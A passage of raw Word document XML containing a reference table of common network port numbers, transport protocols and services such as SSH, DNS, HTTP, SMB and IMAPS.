            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>22 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1905" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="55F22520"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hideMark/>
          </w:tcPr>
          <w:p w14:paraId="45872A78" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>SSH (Secure Shell, SFTP, SCP) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w14:paraId="6E74ED31"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41B47C1D" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>23 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440A4A10"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59C8265F" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Telnet (Insecure remote login) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w14:paraId="0C0637B8" w14:textId="77777777">
        <w:trPr>
          <w:trHeight w:val="540"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1845" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="16BC531C" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>25 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1905" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="51CD18A3"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hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4436F949" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>SMTP (Mail Transfer) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w14:paraId="0A563D2C"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65944B48" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>53 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05190744" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>TCP/UDP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2C3863B7" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>DNS (Domain Name System) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w14:paraId="3966ADE8" w14:textId="77777777">
        <w:trPr>
          <w:trHeight w:val="555"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1845" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="297584B9" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>67, 68 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1905" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1C71687A" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>UDP </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6195" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="45C1DDCC" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>DHCP (Server: 67, Client: 68) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w14:paraId="40CCB98D" w14:textId="77777777">
        <w:trPr>
          <w:trHeight w:val="540"/>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332A6C1B" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>80 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7D8224F1"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04D0294A" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>HTTP (Web Traffic) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w14:paraId="20EFE6FE" w14:textId="77777777">
        <w:trPr>
          <w:trHeight w:val="555"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1845" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="08F71C82" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>110 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1905" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0B0D693E"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hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1C8B23FA" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>POP3 (Email Retrieval) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w14:paraId="6F10C1C9" w14:textId="77777777">
        <w:trPr>
          <w:trHeight w:val="540"/>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2E7D6874" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>143 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1C1CFD3D"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1F2BD17F" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>IMAP (Email Retrieval) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w14:paraId="2A8F8196" w14:textId="77777777">
        <w:trPr>
          <w:trHeight w:val="555"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1845" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="70E73540" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>161/162 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1905" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="70F2D48E" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>UDP </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6195" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2ED1329D" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>SNMP (Monitoring/Management) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w14:paraId="367C7DD1"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5E6B1515" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>179 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4D14AC4E"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2D2318D5" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>BGP (Routing) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w14:paraId="6A5ECC5E" w14:textId="77777777">
        <w:trPr>
          <w:trHeight w:val="540"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1845" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="60F39DFB" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>389 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1905" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7D0084F7" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>TCP/UDP </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6195" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="17F9EF52" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>LDAP (Directory Services) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w14:paraId="4F5BF306"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51D31919" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>443 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2A76C3F4"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29482263" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>HTTPS (Secure Web Traffic) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w14:paraId="042A71B5" w14:textId="77777777">
        <w:trPr>
          <w:trHeight w:val="540"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1845" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15871CD3" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>445 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1905" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7B6996DA"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hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1CCD1EFC" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>SMB (Windows File Sharing) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w14:paraId="6B82BC4F"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6B58DD28" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>993 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4B292E68"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05E634C2" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>IMAPS (Secure IMAP) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w14:paraId="5716C232" w14:textId="77777777">
        <w:trPr>
          <w:trHeight w:val="555"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1845" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="117F07A1" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>995 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1905" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="515478BD"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hideMark/>
          </w:tcPr>
          <w:p w14:paraId="30A8CEEA" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>POP3S (Secure POP3) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w14:paraId="386E3380" w14:textId="77777777">
        <w:trPr>
          <w:trHeight w:val="555"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1845" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCCCCC"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F24D42E" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>3389 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1905" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCCCCC"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="62EC9E48" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>TCP </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6195" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
